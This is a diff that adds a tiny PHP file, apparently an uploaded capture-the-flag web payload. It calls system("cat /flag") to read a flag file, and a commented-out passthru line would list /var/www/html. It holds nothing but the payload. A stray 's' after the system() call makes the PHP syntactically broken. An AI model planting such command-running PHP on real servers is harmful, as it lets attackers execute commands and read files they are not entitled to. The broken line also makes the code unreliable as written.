@@ -1,0 +1,4 @@
+<?php
+	// passthru("ls /var/www/html");
+	system("cat /flag");s
+?>
